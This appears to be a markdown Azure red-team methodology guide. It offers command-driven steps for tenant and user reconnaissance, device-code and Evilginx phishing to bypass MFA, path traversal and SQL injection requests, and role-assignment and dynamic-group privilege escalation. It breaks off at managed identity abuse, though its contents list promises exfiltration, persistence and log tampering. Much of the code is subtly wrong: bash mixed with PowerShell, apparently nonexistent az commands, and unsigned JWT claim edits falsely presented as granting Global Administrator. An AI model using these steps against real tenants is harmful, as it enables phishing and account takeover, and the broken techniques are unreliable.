# Azure Red Team Methodology

## Table of Contents
- [1. Initial Reconnaissance & Enumeration](#1-initial-reconnaissance--enumeration)
  - [Domain & Tenant Enumeration](#domain--tenant-enumeration)
  - [Service Discovery](#service-discovery)
  - [User Enumeration](#user-enumeration)
  - [Resource Enumeration](#resource-enumeration)
  - [Certificate Enumeration](#certificate-enumeration)
  - [Token Enumeration](#token-enumeration)
  - [Graph API Enumeration](#graph-api-enumeration)
  - [Key Vault Enumeration](#key-vault-enumeration)
  - [Logic App Enumeration](#logic-app-enumeration)
  - [Function App Enumeration](#function-app-enumeration)
  - [Container App Enumeration](#container-app-enumeration)
  - [Managed Identity Enumeration](#managed-identity-enumeration)
  - [Service Principal Enumeration](#service-principal-enumeration)
- [2. Initial Access](#2-initial-access)
  - [Phishing & Social Engineering](#phishing--social-engineering)
    - [Device Code Phishing](#device-code-phishing)
    - [Traditional Phishing with Evilginx](#traditional-phishing-with-evilginx)
  - [Web Application Attacks](#web-application-attacks)
    - [Path Traversal](#path-traversal)
    - [SQL Injection](#sql-injection)
  - [Storage Access](#storage-access)
    - [Blob Storage Access](#blob-storage-access)
    - [SAS Token Exploitation](#sas-token-exploitation)
  - [Container App Access](#container-app-access)
  - [Function App Access](#function-app-access)
  - [JWT Assertion Exploitation](#jwt-assertion-exploitation)
  - [Logic App Automation Abuse](#logic-app-automation-abuse)
  - [Key Vault Access Exploitation](#key-vault-access-exploitation)
- [3. Privilege Escalation](#3-privilege-escalation)
  - [Entra ID Escalation](#entra-id-escalation)
    - [Dynamic Group Abuse](#dynamic-group-abuse)
    - [Role Assignment Manipulation](#role-assignment-manipulation)
  - [Azure Resource Escalation](#azure-resource-escalation)
    - [Logic App Automation Abuse](#logic-app-automation-abuse)
    - [Key Vault Access Exploitation](#key-vault-access-exploitation)
  - [Token Manipulation](#token-manipulation)
    - [JWT Assertion Exploitation](#jwt-assertion-exploitation)
  - [Managed Identity Abuse](#managed-identity-abuse)
  - [Service Principal Abuse](#service-principal-abuse)
- [4. Lateral Movement](#4-lateral-movement)
  - [Cloud-to-Cloud Movement](#cloud-to-cloud-movement)
    - [Graph API Exploitation](#graph-api-exploitation)
    - [Exchange/Teams/SharePoint Access](#exchangeteamssharepoint-access)
  - [Hybrid Movement](#hybrid-movement)
    - [On-Premises to Cloud](#on-premises-to-cloud)
  - [Resource Movement](#resource-movement)
    - [Container App Exploitation](#container-app-exploitation)
    - [Function App Movement](#function-app-movement)
  - [Credential Shuffle](#credential-shuffle)
    - [Token Reuse](#token-reuse)
  - [Service Principal Movement](#service-principal-movement)
  - [Managed Identity Movement](#managed-identity-movement)
- [5. Data Exfiltration](#5-data-exfiltration)
  - [Storage Access](#storage-access)
    - [Blob Storage Exfiltration](#blob-storage-exfiltration)
    - [Key Vault Secrets](#key-vault-secrets)
  - [Application Data](#application-data)
    - [Exchange Data](#exchange-data)
    - [Teams Data](#teams-data)
    - [SharePoint Data](#sharepoint-data)
  - [Monitoring & Logging](#monitoring--logging)
    - [Activity Log Access](#activity-log-access)
    - [Diagnostic Settings](#diagnostic-settings)
  - [Graph API Data](#graph-api-data)
  - [Key Vault Data](#key-vault-data)
- [6. Persistence](#6-persistence)
  - [Entra ID Persistence](#entra-id-persistence)
    - [Service Principal Backdoors](#service-principal-backdoors)
    - [Role Assignment Persistence](#role-assignment-persistence)
  - [Azure Resource Persistence](#azure-resource-persistence)
    - [Automation Account Persistence](#automation-account-persistence)
    - [Function App Persistence](#function-app-persistence)
  - [Access Persistence](#access-persistence)
    - [Token Persistence](#token-persistence)
    - [Certificate Persistence](#certificate-persistence)
  - [Token Persistence](#token-persistence)
  - [Certificate Persistence](#certificate-persistence)
  - [Key Persistence](#key-persistence)
  - [Secret Persistence](#secret-persistence)
  - [Connection Persistence](#connection-persistence)
- [7. Cleanup & Obfuscation](#7-cleanup--obfuscation)
  - [Log Manipulation](#log-manipulation)
    - [Activity Log Modification](#activity-log-modification)
  - [Evidence Removal](#evidence-removal)
    - [Service Principal Cleanup](#service-principal-cleanup)
    - [Role Assignment Removal](#role-assignment-removal)
  - [Access Cleanup](#access-cleanup)
    - [Connection Removal](#connection-removal)
    - [Key Removal](#key-removal)
  - [Token Cleanup](#token-cleanup)
  - [Certificate Cleanup](#certificate-cleanup)
  - [Service Principal Cleanup](#service-principal-cleanup)
  - [Role Assignment Cleanup](#role-assignment-cleanup)
  - [Access Policy Cleanup](#access-policy-cleanup)
- [Tools & Techniques](#tools--techniques)
  - [Enumeration Tools](#enumeration-tools)
    - [AADInternals](#aadinternals)
  - [Attack Tools](#attack-tools)
    - [Evilginx](#evilginx)
  - [Post-Exploitation Tools](#post-exploitation-tools)
    - [Azure Storage Explorer](#azure-storage-explorer)
    - [GraphRunner](#graphrunner)
  - [Data Exfiltration Tools](#data-exfiltration-tools)
  - [Cleanup Tools](#cleanup-tools)
  - [Evasion Tools](#evasion-tools)
  - [Persistence Tools](#persistence-tools)
- [Best Practices](#best-practices)
  - [Tool Selection](#tool-selection)
  - [Infrastructure Setup](#infrastructure-setup)
  - [Documentation](#documentation)
  - [Detection Evasion](#detection-evasion)
  - [Cleanup Procedures](#cleanup-procedures)
  - [Persistence Methods](#persistence-methods)
  - [Evasion Techniques](#evasion-techniques)

## 1. Initial Reconnaissance & Enumeration

### Domain & Tenant Enumeration
**Scenario**: You're starting an engagement with only a domain name (e.g., target.com) and need to determine if the organization uses Azure/Entra ID.

**Enumeration Path**:
1. Discovered domain through OSINT
2. Found MX records pointing to Microsoft
3. Identified potential Azure usage through DNS
4. Verified Entra ID usage through getuserrealm.srf

**Prerequisites**:
- Domain name
- Internet access
- PowerShell/Azure CLI installed

**Steps**:
1. Check for Entra ID usage
   ```powershell
   # PowerShell
   [xml]$xmlContent = (iwr 'https://login.microsoftonline.com/getuserrealm.srf?login=domain.com&xml=1').Content
   $xmlContent.DocumentElement
   # Expected Output: NameSpaceType = "Managed" indicates Entra ID usage
   ```

2. Identify tenant ID
   ```powershell
   # PowerShell
   $response = Invoke-WebRequest -Uri "https://login.microsoftonline.com/domain.com/.well-known/openid-configuration"
   $tenantId = ($response.Content | ConvertFrom-Json).token_endpoint -replace '^.+\/([0-9a-fA-F\-]+)\/oauth2.+$','$1'
   Write-Output "Tenant ID:" $tenantId
   # Expected Output: GUID format tenant ID
   ```

3. Enumerate DNS records
   **Windows**
   ```powershell
   # PowerShell - Windows only
   $domain = "domain.com"
   $records = @()
   $records += Resolve-DnsName -Name $domain -Type A -ErrorAction SilentlyContinue
   $records += Resolve-DnsName -Name $domain -Type AAAA -ErrorAction SilentlyContinue
   $records += Resolve-DnsName -Name $domain -Type MX -ErrorAction SilentlyContinue
   $records += Resolve-DnsName -Name $domain -Type TXT -ErrorAction SilentlyContinue
   $records += Resolve-DnsName -Name $domain -Type NS -ErrorAction SilentlyContinue
   $records += Resolve-DnsName -Name $domain -Type CNAME -ErrorAction SilentlyContinue
   $records | Format-List
   # Expected Output: Various DNS records including MX pointing to Microsoft
   ```
   **Linux**
   ```bash
   nslookup domain.com
   $domain = "domain.com"
   $aRecords = nslookup $domain | Select-String "Address:"
   $aRecords
   $aRecords | ForEach-Object { ($_ -split ":")[1].Trim() }
   ```

**Advanced Techniques**:
1. Tenant Enumeration with AADInternals
   ```powershell
   # PowerShell
   Install-Module AADInternals
   Import-Module AADInternals
   Get-AADIntTenantID -Domain "domain.com"
   Get-AADIntLoginInformation -Domain "domain.com"
   ```

2. Tenant Discovery through Graph API
   ```powershell
   # PowerShell
   $clientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
   $body = @{
       "client_id" = $clientId
       "resource" = "https://graph.microsoft.com"
   }
   $response = Invoke-RestMethod -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
   $response
   ```

**Success Indicators**:
- Confirmed Entra ID usage
- Obtained tenant ID
- Identified Microsoft 365 services

**Related Sections**:
- [Service Discovery](#service-discovery)
- [User Enumeration](#user-enumeration)
- [Resource Enumeration](#resource-enumeration)

### Service Discovery
**Scenario**: You've confirmed the organization uses Azure and need to map their cloud infrastructure.

**Enumeration Path**:
1. Confirmed Entra ID usage
2. Discovered Azure resources through DNS
3. Identified public-facing applications
4. Mapped service endpoints

**Prerequisites**:
- Valid Azure credentials
- Azure CLI installed
- Appropriate permissions

**Steps**:
1. Map Azure service endpoints
   ```powershell
   # Azure CLI
   az login
   az account show
   az account list
   az group list
   az resource list
   # Expected Output: List of Azure resources and their configurations
   ```

2. Identify public-facing applications
   ```powershell
   # Azure CLI
   az webapp list
   az functionapp list
   az containerapp list
   # Expected Output: List of web applications, function apps, and container apps
   ```

**Advanced Techniques**:
1. Service Discovery with Graph API
   ```powershell
   # PowerShell
   Connect-MgGraph -Scopes "User.Read.All", "Group.Read.All", "Mail.Read"
   Get-MgUser -All
   Get-MgGroup -All
   Get-MgTeam -All
   ```

2. Resource Enumeration with AADInternals
   ```powershell
   # PowerShell
   Get-AADIntReconAsOutsider -Domain "domain.com"
   Get-AADIntReconAsInsider -Domain "domain.com"
   ```

**Success Indicators**:
- Mapped Azure resources
- Identified public endpoints
- Discovered application types

**Related Sections**:
- [Domain & Tenant Enumeration](#domain--tenant-enumeration)
- [User Enumeration](#user-enumeration)
- [Resource Enumeration](#resource-enumeration)

### User Enumeration
**Scenario**: You need to identify valid users for potential phishing or password spraying attacks.

**Enumeration Path**:
1. Discovered email format through DNS
2. Found user information through OSINT
3. Identified potential targets
4. Generated username list

**Prerequisites**:
- Domain name
- Python/Ruby installed
- Internet access

**Steps**:
1. Use Oh365UserFinder
   ```ruby
   # Install
   git clone https://github.com/dievus/Oh365UserFinder
   cd Oh365UserFinder
   pip3 install -r requirements.txt

   # Run
   python3 Oh365UserFinder.py -d domain.com -u users.txt
   # Expected Output: List of valid users
   ```

2. Generate username permutations
   ```ruby
   # Install
   git clone https://github.com/urbanadventurer/username-anarchy
   cd username-anarchy

   # Run
   ruby username-anarchy --suffix @domain.com "Full Name" > users.txt
   # Expected Output: List of possible usernames
   ```

**Advanced Techniques**:
1. User Enumeration with Graph API
   ```powershell
   # PowerShell
   Connect-MgGraph -Scopes "User.Read.All"
   Get-MgUser -All
   Get-MgUser -Filter "userType eq 'Member'"
   ```

2. User Discovery with AADInternals
   ```powershell
   # PowerShell
   Get-AADIntUsers -Domain "domain.com"
   Get-AADIntUsers -Domain "domain.com" -IncludeGuests
   ```

**Success Indicators**:
- Identified valid users
- Generated username list
- Confirmed email format

**Related Sections**:
- [Domain & Tenant Enumeration](#domain--tenant-enumeration)
- [Service Discovery](#service-discovery)
- [Resource Enumeration](#resource-enumeration)

### Resource Enumeration
**Scenario**: You need to identify and map Azure resources for potential exploitation.

**Enumeration Path**:
1. Discovered Azure resources through DNS
2. Identified service principals
3. Found managed identities
4. Mapped automation accounts
5. Discovered Key Vaults

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. Enumerate storage accounts
   ```powershell
   # Azure CLI
   az storage account list
   az storage account show --name <storage-account>
   # Expected Output: Storage account details and configuration
   ```

2. Identify blob containers
   ```powershell
   # Azure CLI
   az storage container list --account-name <storage-account>
   az storage blob list --container-name <container> --account-name <storage-account>
   # Expected Output: Container and blob listings
   ```

3. Map service principals
   ```powershell
   # Azure CLI
   az ad sp list
   az ad sp show --id <sp-id>
   # Expected Output: Service principal details and permissions
   ```

4. Discover managed identities
   ```powershell
   # Azure CLI
   az functionapp identity show --name <function-app>
   az webapp identity show --name <web-app>
   # Expected Output: Managed identity details
   ```

5. Enumerate Key Vaults
   ```powershell
   # Azure CLI
   az keyvault list
   az keyvault show --name <vault>
   # Expected Output: Key Vault details and access policies
   ```

6. Discover automation accounts
   ```powershell
   # Azure CLI
   az automation account list
   az automation runbook list --automation-account-name <account>
   # Expected Output: Automation account details and runbooks
   ```

7. Map Logic Apps
   ```powershell
   # Azure CLI
   az logic workflow list
   az logic workflow show --name <workflow>
   # Expected Output: Logic app details and workflows
   ```

**Success Indicators**:
- Mapped all Azure resources
- Identified service principals
- Discovered managed identities
- Found Key Vaults
- Located automation accounts

### Certificate Enumeration
**Scenario**: You need to identify and analyze certificates for potential exploitation.

**Enumeration Path**:
1. Discovered certificates in storage
2. Found service principal certificates
3. Identified managed identity certificates
4. Located Key Vault certificates

**Prerequisites**:
- Access to certificates
- PowerShell
- Appropriate permissions

**Steps**:
1. Analyze PFX certificates
   ```powershell
   # PowerShell
   Get-PfxCertificate -FilePath <path>
   # Expected Output: Certificate details and validity
   ```

2. Import certificates
   ```powershell
   # PowerShell
   Import-PfxCertificate -FilePath <path> -CertStoreLocation Cert:\CurrentUser\My
   # Expected Output: Certificate import confirmation
   ```

**Success Indicators**:
- Valid certificates found
- Certificates imported
- Access gained

### Token Enumeration
**Scenario**: You need to identify and analyze tokens for potential exploitation.

**Enumeration Path**:
1. Discovered JWT tokens
2. Found access tokens
3. Identified refresh tokens
4. Located service principal tokens

**Prerequisites**:
- Access to tokens
- PowerShell
- Appropriate permissions

**Steps**:
1. Analyze JWT tokens
   ```powershell
   # PowerShell
   $token = Get-AzAccessToken
   $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.split('.')[1]))
   $decoded | ConvertFrom-Json
   # Expected Output: Decoded token claims
   ```

2. Extract token claims
   ```powershell
   # PowerShell
   Get-AzToken
   # Expected Output: Token details and claims
   ```

**Success Indicators**:
- Valid tokens found
- Claims extracted
- Access gained

### Graph API Enumeration
**Scenario**: You need to enumerate and access Microsoft Graph API resources.

**Enumeration Path**:
1. Discovered Graph API access through tokens
2. Identified available endpoints
3. Mapped service permissions
4. Located sensitive data

**Prerequisites**:
- Valid Graph API token
- Microsoft.Graph PowerShell module
- Appropriate permissions

**Steps**:
1. Connect to Graph API
   ```powershell
   # PowerShell
   Connect-MgGraph -Scopes "User.Read.All", "Group.Read.All", "Mail.Read"
   # Expected Output: Connection confirmation
   ```

2. Enumerate users
   ```powershell
   # PowerShell
   Get-MgUser -All
   Get-MgUser -Filter "userType eq 'Member'"
   # Expected Output: List of users and their properties
   ```

3. Enumerate groups
   ```powershell
   # PowerShell
   Get-MgGroup -All
   Get-MgGroupMember -GroupId <group-id>
   # Expected Output: List of groups and members
   ```

4. Access Exchange data
   ```powershell
   # PowerShell
   Get-MgUserMailbox
   Get-MgUserMessage -UserId <user-id>
   # Expected Output: Mailbox and message data
   ```

**Success Indicators**:
- Successful Graph API connection
- Retrieved user data
- Accessed group information
- Retrieved mailbox data

**Troubleshooting**:
- If connection fails, verify token validity
- If permissions denied, check token scopes
- If data missing, verify user permissions
- If rate limited, implement delays

### Key Vault Enumeration
**Scenario**: You need to enumerate and access Azure Key Vault resources.

**Enumeration Path**:
1. Discovered Key Vaults through resource enumeration
2. Identified access policies
3. Mapped secrets and keys
4. Located certificates

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. List Key Vaults
   ```powershell
   # Azure CLI
   az keyvault list
   az keyvault show --name <vault>
   # Expected Output: Key Vault details and configuration
   ```

2. Check access policies
   ```powershell
   # Azure CLI
   az keyvault show --name <vault> --query "properties.accessPolicies"
   # Expected Output: Access policy details
   ```

3. List secrets
   ```powershell
   # Azure CLI
   az keyvault secret list --vault-name <vault>
   az keyvault secret show --vault-name <vault> --name <secret>
   # Expected Output: Secret listings and values
   ```

4. List certificates
   ```powershell
   # Azure CLI
   az keyvault certificate list --vault-name <vault>
   az keyvault certificate show --vault-name <vault> --name <cert>
   # Expected Output: Certificate listings and details
   ```

**Success Indicators**:
- Retrieved Key Vault information
- Accessed secrets
- Retrieved certificates
- Modified access policies

**Troubleshooting**:
- If access denied, check permissions
- If vault not found, verify name
- If secret missing, check access
- If certificate invalid, verify validity

### Logic App Enumeration
**Scenario**: You need to enumerate and exploit Azure Logic Apps.

**Enumeration Path**:
1. Discovered Logic Apps through resource enumeration
2. Identified workflows
3. Mapped triggers and actions
4. Located sensitive data

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. List Logic Apps
   ```powershell
   # Azure CLI
   az logic workflow list
   az logic workflow show --name <workflow>
   # Expected Output: Logic App details and configuration
   ```

2. Check triggers
   ```powershell
   # Azure CLI
   az logic workflow trigger list --workflow-name <workflow>
   # Expected Output: Trigger details
   ```

3. List actions
   ```powershell
   # Azure CLI
   az logic workflow action list --workflow-name <workflow>
   # Expected Output: Action details
   ```

4. Check connections
   ```powershell
   # Azure CLI
   az logic workflow connection list --workflow-name <workflow>
   # Expected Output: Connection details
   ```

**Success Indicators**:
- Retrieved Logic App information
- Accessed workflows
- Modified triggers
- Exploited actions

**Troubleshooting**:
- If app not found, verify name
- If access denied, check permissions
- If trigger fails, verify configuration
- If action fails, check parameters

### Function App Enumeration
**Scenario**: You need to enumerate and exploit Azure Function Apps.

**Enumeration Path**:
1. Discovered Function Apps through resource enumeration
2. Identified functions
3. Mapped triggers and bindings
4. Located sensitive data

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. List Function Apps
   ```powershell
   # Azure CLI
   az functionapp list
   az functionapp show --name <function-app>
   # Expected Output: Function App details and configuration
   ```

2. List functions
   ```powershell
   # Azure CLI
   az functionapp function list --name <function-app>
   # Expected Output: Function details
   ```

3. Check configuration
   ```powershell
   # Azure CLI
   az functionapp config show --name <function-app>
   # Expected Output: Configuration details
   ```

4. Access function code
   ```powershell
   # Azure CLI
   az functionapp function show --name <function-app> --function-name <function>
   # Expected Output: Function code and configuration
   ```

**Success Indicators**:
- Retrieved Function App information
- Accessed functions
- Modified configuration
- Exploited vulnerabilities

**Troubleshooting**:
- If app not found, verify name
- If access denied, check permissions
- If function fails, verify code
- If configuration invalid, check settings

### Container App Enumeration
**Scenario**: You need to enumerate and exploit Azure Container Apps.

**Enumeration Path**:
1. Discovered Container Apps through resource enumeration
2. Identified containers
3. Mapped configurations
4. Located sensitive data

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. List Container Apps
   ```powershell
   # Azure CLI
   az containerapp list
   az containerapp show --name <container-app>
   # Expected Output: Container App details and configuration
   ```

2. Check configurations
   ```powershell
   # Azure CLI
   az containerapp show --name <container-app> --query "properties.configuration"
   # Expected Output: Configuration details
   ```

3. List revisions
   ```powershell
   # Azure CLI
   az containerapp revision list --name <container-app>
   # Expected Output: Revision details
   ```

4. Check secrets
   ```powershell
   # Azure CLI
   az containerapp show --name <container-app> --query "properties.configuration.secrets"
   # Expected Output: Secret details
   ```

**Success Indicators**:
- Retrieved Container App information
- Accessed configurations
- Modified settings
- Exploited vulnerabilities

**Troubleshooting**:
- If app not found, verify name
- If access denied, check permissions
- If configuration invalid, check settings
- If secret missing, verify access

### Managed Identity Enumeration
**Scenario**: You need to enumerate and exploit managed identities.

**Enumeration Path**:
1. Discovered managed identities through resource enumeration
2. Identified assigned resources
3. Mapped permissions
4. Located sensitive data

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. List managed identities
   ```powershell
   # Azure CLI
   az identity list
   az identity show --name <identity>
   # Expected Output: Managed identity details
   ```

2. Check assignments
   ```powershell
   # Azure CLI
   az role assignment list --assignee <identity-id>
   # Expected Output: Role assignment details
   ```

3. Verify permissions
   ```powershell
   # Azure CLI
   az role assignment list --assignee <identity-id> --query "[].roleDefinitionName"
   # Expected Output: Permission details
   ```

**Success Indicators**:
- Retrieved managed identity information
- Accessed assigned resources
- Modified permissions
- Exploited access

**Troubleshooting**:
- If identity not found, verify name
- If access denied, check permissions
- If assignment missing, verify configuration
- If permission invalid, check roles

## 2. Initial Access

### Phishing & Social Engineering
**Scenario**: You've identified a target user and need to gain initial access through phishing.

**Enumeration Path**:
1. Identified valid users
2. Discovered MFA usage
3. Found potential phishing targets
4. Determined best phishing method

**Prerequisites**:
- Valid target user
- Evilginx server
- Domain for phishing
- SSL certificate

**Steps**:
1. Device code phishing
   ```powershell
   # PowerShell
   $body=@{
       "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
       "resource" =  "https://graph.microsoft.com"
   }
   $authResponse=(Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body)
   $authResponse
   # Expected Output: Device code and user code
   ```

2. Traditional phishing with Evilginx
   ```ruby
   # Evilginx Setup
   git clone https://github.com/kgretzky/evilginx2
   cd evilginx2
   make
   ./evilginx
   phishlets hostname o365-mfa domain.com
   phishlets enable o365-mfa
   lures get-url <lure-id>
   # Expected Output: Phishing URL
   ```

**Advanced Techniques**:
1. MFA Bypass with Evilginx
   ```ruby
   # Evilginx Configuration
   phishlets hostname o365-mfa domain.com
   phishlets enable o365-mfa
   lures create o365-mfa
   lures get-url <lure-id>
   ```

2. Token Capture and Reuse
   ```powershell
   # PowerShell
   $token = Get-AzAccessToken
   $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.split('.')[1]))
   $decoded | ConvertFrom-Json
   ```

**Success Indicators**:
- Captured credentials
- Obtained tokens
- Bypassed MFA

**Related Sections**:
- [User Enumeration](#user-enumeration)
- [Token Manipulation](#token-manipulation)
- [Token Persistence](#token-persistence)

### Web Application Attacks
**Scenario**: You've discovered a vulnerable web application and need to exploit it for access.

**Enumeration Path**:
1. Discovered web applications
2. Identified potential vulnerabilities
3. Tested for common issues
4. Confirmed exploitability

**Prerequisites**:
- Vulnerable web application
- Appropriate tools
- Network access

**Steps**:
1. Path traversal
   ```powershell
   # PowerShell
   Invoke-WebRequest -Uri "https://webapp.azurewebsites.net/../../../etc/passwd"
   # Expected Output: File contents or error
   ```

2. SQL injection
   ```powershell
   # PowerShell
   $payload = "' OR '1'='1"
   Invoke-WebRequest -Uri "https://functionapp.azurewebsites.net/api/function?param=$payload"
   # Expected Output: SQL query results or error
   ```

**Advanced Techniques**:
1. JWT Token Manipulation
   ```powershell
   # PowerShell
   $token = Get-AzAccessToken
   $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.split('.')[1]))
   $decoded | ConvertFrom-Json
   ```

2. Function App Exploitation
   ```powershell
   # PowerShell
   az functionapp function list --name <function-app>
   az functionapp function show --name <function-app> --function-name <function>
   ```

**Success Indicators**:
- Successful file access
- SQL query results
- Error messages indicating vulnerability

**Related Sections**:
- [Function App Access](#function-app-access)
- [JWT Assertion Exploitation](#jwt-assertion-exploitation)
- [Token Manipulation](#token-manipulation)

### Storage Access
**Scenario**: You need to gain access to Azure storage resources.

**Enumeration Path**:
1. Discovered storage accounts
2. Identified containers
3. Found sensitive data
4. Determined access method

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. Blob storage enumeration
   ```powershell
   # Azure CLI
   az storage blob list --account-name <storage-account> --container-name <container>
   az storage blob download --account-name <storage-account> --container-name <container> --name <blob>
   ```

2. SAS token exploitation
   ```powershell
   # Azure CLI
   az storage blob list --account-name <storage-account> --sas-token "<sas-token>"
   ```

**Advanced Techniques**:
1. Storage Account Access with Managed Identity
   ```powershell
   # PowerShell
   az storage account list
   az storage account show --name <storage-account>
   ```

2. Container Access with Service Principal
   ```powershell
   # PowerShell
   az storage container list --account-name <storage-account>
   az storage blob list --container-name <container> --account-name <storage-account>
   ```

**Success Indicators**:
- Accessed storage accounts
- Retrieved sensitive data
- Modified access policies

**Related Sections**:
- [Resource Enumeration](#resource-enumeration)
- [Managed Identity Abuse](#managed-identity-abuse)
- [Service Principal Abuse](#service-principal-abuse)

### Container App Access
**Scenario**: You need to access Azure Container Apps.

**Enumeration Path**:
1. Discovered Container Apps through resource enumeration
2. Identified containers
3. Mapped configurations
4. Located sensitive data

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. List Container Apps
   ```powershell
   # Azure CLI
   az containerapp list
   az containerapp show --name <container-app>
   # Expected Output: Container App details and configuration
   ```

2. Check configurations
   ```powershell
   # Azure CLI
   az containerapp show --name <container-app> --query "properties.configuration"
   # Expected Output: Configuration details
   ```

3. List revisions
   ```powershell
   # Azure CLI
   az containerapp revision list --name <container-app>
   # Expected Output: Revision details
   ```

4. Check secrets
   ```powershell
   # Azure CLI
   az containerapp show --name <container-app> --query "properties.configuration.secrets"
   # Expected Output: Secret details
   ```

**Success Indicators**:
- Retrieved Container App information
- Accessed configurations
- Modified settings
- Exploited vulnerabilities

**Troubleshooting**:
- If app not found, verify name
- If access denied, check permissions
- If configuration invalid, check settings
- If secret missing, verify access

### Function App Access
**Scenario**: You need to access Azure Function Apps.

**Enumeration Path**:
1. Discovered Function Apps through resource enumeration
2. Identified functions
3. Mapped triggers and bindings
4. Located sensitive data

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. List Function Apps
   ```powershell
   # Azure CLI
   az functionapp list
   az functionapp show --name <function-app>
   # Expected Output: Function App details and configuration
   ```

2. List functions
   ```powershell
   # Azure CLI
   az functionapp function list --name <function-app>
   # Expected Output: Function details
   ```

3. Check configuration
   ```powershell
   # Azure CLI
   az functionapp config show --name <function-app>
   # Expected Output: Configuration details
   ```

4. Access function code
   ```powershell
   # Azure CLI
   az functionapp function show --name <function-app> --function-name <function>
   # Expected Output: Function code and configuration
   ```

**Success Indicators**:
- Retrieved Function App information
- Accessed functions
- Modified configuration
- Exploited vulnerabilities

**Troubleshooting**:
- If app not found, verify name
- If access denied, check permissions
- If function fails, verify code
- If configuration invalid, check settings

## 3. Privilege Escalation

### Entra ID Escalation
**Scenario**: You have a low-privileged account and need to escalate privileges.

**Enumeration Path**:
1. Discovered dynamic groups
2. Identified role assignments
3. Found potential escalation paths
4. Determined best approach

**Prerequisites**:
- Valid Azure credentials
- Azure CLI installed
- Appropriate permissions

**Steps**:
1. Dynamic group abuse
   ```powershell
   # PowerShell
   Get-AzureADGroup -Filter "displayName eq 'Dynamic Group'"
   Set-AzureADUser -ObjectId <user-id> -JobTitle "New Title"
   ```

2. Role assignment manipulation
   ```powershell
   # Azure CLI
   az role assignment list
   az role assignment create --assignee <principal-id> --role <role-name>
   ```

**Advanced Techniques**:
1. Dynamic Group Exploitation
   ```powershell
   # PowerShell
   Get-AzureADGroup -Filter "displayName eq 'Dynamic Group'"
   Get-AzureADGroupMember -ObjectId <group-id>
   Set-AzureADUser -ObjectId <user-id> -JobTitle "New Title"
   ```

2. Role Assignment Abuse
   ```powershell
   # PowerShell
   az role assignment list
   az role assignment create --assignee <principal-id> --role <role-name>
   az role assignment delete --assignee <principal-id> --role <role-name>
   ```

**Success Indicators**:
- Modified group membership
- Changed role assignments
- Gained elevated access

**Related Sections**:
- [User Enumeration](#user-enumeration)
- [Service Principal Abuse](#service-principal-abuse)
- [Role Assignment Manipulation](#role-assignment-manipulation)

### Azure Resource Escalation
**Scenario**: You need to escalate privileges within Azure resources.

**Enumeration Path**:
1. Discovered Logic Apps
2. Identified Key Vaults
3. Found automation accounts
4. Determined escalation path

**Prerequisites**:
- Azure CLI installed
- Valid credentials
- Appropriate permissions

**Steps**:
1. Logic app automation abuse
   ```powershell
   # Azure CLI
   az logic workflow list
   az logic workflow show --name <workflow>
   ```

2. Key Vault access exploitation
   ```powershell
   # Azure CLI
   az keyvault list
   az keyvault secret list --vault-name <vault>
   ```

**Advanced Techniques**:
1. Logic App Exploitation
   ```powershell
   # PowerShell
   az logic workflow list
   az logic workflow show --name <workflow>
   az logic workflow trigger list --workflow-name <workflow>
   az logic workflow action list --workflow-name <workflow>
   ```

2. Key Vault Access Abuse
   ```powershell
   # PowerShell
   az keyvault list
   az keyvault show --name <vault>
   az keyvault secret list --vault-name <vault>
   az keyvault secret show --vault-name <vault> --name <secret>
   ```

**Success Indicators**:
- Accessed Logic Apps
- Retrieved Key Vault secrets
- Modified automation accounts

**Related Sections**:
- [Logic App Enumeration](#logic-app-enumeration)
- [Key Vault Enumeration](#key-vault-enumeration)
- [Automation Account Persistence](#automation-account-persistence)

### Token Manipulation
**Scenario**: You need to manipulate tokens for privilege escalation.

**Enumeration Path**:
1. Discovered JWT tokens
2. Identified token claims
3. Found potential modifications
4. Determined best approach

**Prerequisites**:
- Access to tokens
- PowerShell
- Appropriate permissions

**Steps**:
1. JWT assertion exploitation
   ```powershell
   # PowerShell
   $token = Get-AzAccessToken
   $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.split('.')[1]))
   $decoded | ConvertFrom-Json
   ```

**Advanced Techniques**:
1. Token Claim Manipulation
   ```powershell
   # PowerShell
   $token = Get-AzAccessToken
   $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.split('.')[1]))
   $claims = $decoded | ConvertFrom-Json
   $claims.roles = @("Global Administrator")
   $modifiedToken = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($claims | ConvertTo-Json))
   ```

2. Token Reuse and Abuse
   ```powershell
   # PowerShell
   $token = Get-AzAccessToken
   $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.split('.')[1]))
   $claims = $decoded | ConvertFrom-Json
   $claims.scp = "User.Read.All Group.Read.All Mail.Read"
   $modifiedToken = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($claims | ConvertTo-Json))
   ```

**Success Indicators**:
- Modified token claims
- Gained elevated access
- Bypassed restrictions

**Related Sections**:
- [JWT Assertion Exploitation](#jwt-assertion-exploitation)
- [Token Persistence](#token-persistence)
- [Token Cleanup](#token-cleanup)

### Managed Identity Abuse
**Scenario**: You need to abuse managed identities for privilege escalation.

- Managed identity impersonation
  ```powershell
  # PowerShell
  az identity show --name <identity>
  ```

